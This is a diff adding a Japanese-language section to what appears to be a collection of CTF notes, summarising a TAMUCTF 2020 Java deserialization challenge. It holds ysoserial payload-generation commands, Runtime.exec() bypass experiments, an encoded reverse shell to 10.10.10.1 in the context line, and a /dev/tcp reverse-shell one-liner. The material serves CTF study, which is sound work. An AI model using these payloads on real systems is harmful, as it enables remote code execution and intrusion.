@@ -658,9 +658,92 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,
 ```
 - **payload**  
 
-## 
+## ysoserial Spring / Runtime.exec() ReverseShell Payload with fixed-ysoserial (TAMUCTF2020 Too_Many_Credits)
+https://github.com/abinpaul1/CTF-Writeups/blob/master/TAMUCTF%202020%20-%20Too_Many_Credits/README.md  
 - **entrypoint**  
-- **payload**  
+Cookieを見るとBase64エンコードされた値`H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==`がある。  
+これをデコードすると意味不明になったため、ファイルに保存して`file`で確認すると`gzip`であることがわかり、それを以下のように解凍するとJavaのシリアライズされたデータであることがわかる。  
+```txt
+echo -n H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA== | base64 -d | gzip -d >> java_ser_obj
+```
+SerializationDumperで確認すると、long型のvalueが`0x00 00 00 00 00 00 00 03`に設定されている。この値を大きな値(2億って書いてるけど)にセットしてCookieにセットすればFlagが降ってくるらしい。これが一つ目のFlag。  
+  
+ysoserialでペイロードをセットする。以下のBruteスクリプトが便利かも？  
+https://github.com/NickstaDB/SerialBrute  
+JavaのWebアプリなのでSpringをはじめに試して成功したらしい。  
+成功したかどうかはエラーページに、`org.codehaus.groovy.runtime.ConvertedClosure`みたいな存在しないクラスの名前が表示されるかどうかでわかるらしい。成功していれば、`No message available`みたいなエラーになるらしい。  
+```txt
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 'ping -n 1 8.8.8.8' | gzip | base64 -w0
+```
+pingは実行できているが、`bash -i >& /dev/tcp/0.0.0.0/8065 0>&1`だとうまく行かなかったらしい。  
+Javaの`Runtime.exec`でコマンドを実行するときには、`ls -al`みたいなコマンドは成功するが、Rever shell Paylaodのようなパイプ、リダイレクト、クオーテーションの入ったシェルスクリプトはうまく実行できないらしい。  
+これを解決するために、`Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", "command"})`のように配列として渡してやれば複雑なPaylaodも実行できるらしくて、その改良版ysoserialが以下にある。  
+https://github.com/pimps/ysoserial-modified  
+以下で生成したPayloadでうまく行ったらしい。  
+```txt
+java -jar ysoserial-modified.jar Spring1 bash 'bash -i >& /dev/tcp/x.x.x.x/8065 0>&1' | gzip | base64 -w0
+```
+- **Runtime.exec()で実行できるコマンド**  
+https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html  
+ここに`Runtime.exec`で複雑なシェルスクリプトを実行するための方法が書かれている。  
+Paiza上で以下のようにして確認してみた。`exCmd("id")`とかでコマンドを実行する。  
+```java
+import java.util.*;
+import java.io.*;
+
+public class Main {
+    public static void exCmd(String args) throws IOException{
+	    Process p = Runtime.getRuntime().exec(args);
+	    byte[] b = new byte[1];
+	
+	    while (p.getErrorStream().read(b) > 0)
+		    System.out.write(b);
+    	while (p.getInputStream().read(b) > 0)
+	    	System.out.write(b);
+        }
+
+    public static void main(String[] args) throws Exception {
+	    exCmd("uname -a");
+    }
+}
+```
+実験結果は以下のようになった。つまり、`exCmd("sh -c $@|sh . echo /bin/echo -e 'tab\trequired'");`のようにすれば実行できてるっぽい。  
+```txt
+exCmd("uname -a");
+OK
+
+exCmd("sh -c 'uname'");
+OK
+
+exCmd("sh -c 'uname -a'");  これだとダメだった
+N
+
+exCmd("sh -c $@ 0 uname -a");
+OK
+
+exCmd("sh -c $@|sh . echo uname");
+OK
+
+exCmd("sh -c $@|sh . echo uname -a");
+OK
+
+exCmd("sh -c $@|sh . echo /bin/echo -e 'tab\trequired'");
+OK tab required
+
+exCmd("sh -c $@|sh . echo /bin/echo -e 'tab required'");
+OK tab required
+
+
+exCmd("sh -c $@|sh . echo ps ft");
+OK
+    PID TTY      STAT   TIME COMMAND
+      1 ?        Ss     0:00 sh -c /sbin/ifconfig eth0 > ifconfig.txt; rm ifconfig.txt; LANG=en_US.UTF-8 HOME=/workspace /usr/bin/time -v -o exec_time.txt ./run_user runner3 /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages  Main <exec_stdin.txt >exec_stdout.txt 2>exec_stderr.txt;echo $? > exec_exit_code.txt
+      8 ?        S      0:00 /usr/bin/time -v -o exec_time.txt ./run_user runner3 /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages Main
+      9 ?        Sl     0:00  \_ /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages Main
+     22 ?        S      0:00      \_ sh -c $@|sh . echo ps ft
+     24 ?        S      0:00          \_ sh
+     25 ?        R      0:00              \_ ps ft
+```
 ## 
 - **entrypoint**  
 - **payload**  
